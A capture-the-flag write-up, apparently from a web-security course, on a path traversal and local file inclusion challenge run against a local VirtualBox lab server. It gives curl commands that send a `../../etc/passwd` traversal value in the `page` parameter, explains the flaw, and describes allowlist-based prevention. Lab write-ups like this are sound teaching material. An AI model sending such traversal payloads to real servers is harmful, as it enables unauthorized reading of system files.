# Include

## 1. Discovery

The application uses the `page` query parameter to select page content. Test this parameter because a page name supplied by the client may affect which file the server loads. In this challenge, a traversal value in `page` reaches the flag response.

## 2. Exploitation

Send the traversal value directly in the URL:

```bash
curl -s \
"http://127.0.0.1:8080/?page=../../../../../../../../../../etc/passwd" \
| grep "Good Job"
```

Observed result: the response displays the challenge flag.

Encoding the parameter with `--data-urlencode` produced a different response during testing:

```bash
curl -sG \
--data-urlencode 'page=../../../../../../../../../../etc/passwd' \
"http://127.0.0.1:8080/"
```

Observed result: the response contains `Wtf ?`. Use the direct URL form above to reproduce the flag response.

## 3. Technical Explanation

The value `../../` moves up through directory levels in a file path. This is path traversal. If an application uses a client supplied path to choose a file for an include operation, path traversal can lead to local file inclusion (LFI). The observed request returns the flag, but this result alone does not prove that `/etc/passwd` was read or that every local file can be included.

## 4. Security Impact

Path traversal can let an attacker access files outside the intended directory. If the application includes the selected file, LFI may expose local data or cause unintended server behavior. The exact impact depends on how the application builds and uses the path. The observed result confirms the flag response for this input; it does not confirm broader file access or code execution.

## 5. Prevention

Use a strict allowlist of page names and map each allowed name to a fixed file on the server. Do not use a client supplied value as a file path. If paths must be accepted, resolve the path on the server, keep it inside the approved directory, and reject traversal or any resolved path outside that directory. Validate on the server before opening or including a file.

## 6. Flag Verification

Run the command from the repository root. It matches the response's `The flag is :` text, extracts that value, and compares it with `mandatory/include/flag`:

```bash
curl -s \
"http://127.0.0.1:8080/?page=../../../../../../../../../../etc/passwd" \
| grep -oE 'The flag is : [a-f0-9]{64}' \
| grep -oE '[a-f0-9]{64}' \
| diff - mandatory/include/flag
```

An exit status of `0` means that the retrieved flag matches the saved flag. The address `127.0.0.1:8080` is our local VirtualBox port-forwarding address. Adjust it if the evaluation environment uses a different address or port.
